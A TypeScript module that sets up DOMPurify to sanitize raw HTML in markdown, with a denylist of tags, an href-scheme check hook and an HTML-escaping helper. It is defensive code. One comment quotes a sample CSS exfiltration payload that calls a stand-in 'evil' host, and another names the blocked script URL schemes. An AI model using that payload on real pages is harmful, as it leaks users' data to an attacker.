import DOMPurify, { type Config } from "dompurify";
import { safeHref } from "./safeHref";

// Re-run our app-wide URL policy after DOMPurify's own attribute pass
// so raw HTML <a>/<area> tags inherit the same denylist as Markdown
// links. DOMPurify's default URI regexp already blocks javascript:,
// vbscript:, data: — this hook is defense in depth and the single
// source of truth for href schemes.
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (!(node instanceof Element)) return;
  for (const attr of ["href", "xlink:href"]) {
    const val = node.getAttribute(attr);
    if (val !== null && safeHref(val) === undefined) {
      node.removeAttribute(attr);
    }
  }
});

const CONFIG: Config = {
  ALLOW_DATA_ATTR: true,
  ALLOW_ARIA_ATTR: true,
  FORBID_TAGS: [
    "script",
    "style",
    "iframe",
    "object",
    "embed",
    "form",
    "input",
    "button",
    "select",
    "textarea",
    "link",
    "meta",
    "base",
    "frame",
    "frameset",
    "noscript",
  ],
  // The renderer never emits user-controlled inline styles itself
  // (KaTeX / Mermaid / Shiki output their own styles via separate
  // dangerouslySetInnerHTML sites that don't pass through this
  // sanitizer). Stripping `style` from raw HTML in markdown defangs
  // CSS-based exfiltration via `background: url(https://evil/?leak=…)`
  // without affecting any legitimate authoring path.
  FORBID_ATTR: ["style"],
};

export function sanitizeHtml(raw: string): string {
  return DOMPurify.sanitize(raw, CONFIG) as unknown as string;
}

const HTML_ESCAPE: Record<string, string> = {
  "&": "&amp;",
  "<": "&lt;",
  ">": "&gt;",
  '"': "&quot;",
  "'": "&#39;",
};

export function escapeHtml(s: string): string {
  return s.replace(/[&<>"']/g, (c) => HTML_ESCAPE[c]);
}
